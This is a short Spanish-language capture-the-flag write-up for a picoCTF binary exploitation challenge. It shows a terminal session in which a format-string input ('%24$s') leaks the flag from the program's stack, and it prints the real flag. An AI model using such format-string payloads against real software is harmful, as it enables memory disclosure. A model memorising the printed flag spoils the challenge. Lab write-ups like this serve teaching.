## Objetivo
Story telling class 1/2.
## Solución
```
┌──(kali㉿kali)-[~/picoCTF/BinExp/FlagLeak]
└─$ wget https://artifacts.picoctf.net/c/93/vuln
--2024-11-13 00:54:23--  https://artifacts.picoctf.net/c/93/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.225.222.105, 13.225.222.28, 13.225.222.120, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.225.222.105|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15876 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                         100%[============================================>]  15.50K  --.-KB/s    in 0.003s  

2024-11-13 00:54:24 (4.81 MB/s) - ‘vuln’ saved [15876/15876]

                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/FlagLeak]
└─$ chmod +x vuln
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/FlagLeak]
└─$ echo "picoCTF{banderota}" > flag.txt
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/FlagLeak]
└─$ ./vuln
Tell me a story and then I'll tell you one >> %x
Here's a story - 
ff95b7a0
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/FlagLeak]
└─$ ./vuln
Tell me a story and then I'll tell you one >> %24$s
Here's a story - 
zsh: segmentation fault  ./vuln
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/FlagLeak]
└─$ ./vuln
Tell me a story and then I'll tell you one >> %24$x
Here's a story - 
1
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/FlagLeak]
└─$ nc saturn.picoctf.net 57901                 
Tell me a story and then I'll tell you one >> %24$s
Here's a story - 
picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}
```

- ##### Al pedirle al programa que nos muestre lo que hay en el espacio "%24$s", obtenemos la bandera.
```
Flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}
```
## Notas Adicionales
## Referencias
- [PicoCTF](https://play.picoctf.org)
- [PicoCTF Writeups](https://www.youtube.com/playlist?list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&authuser=0)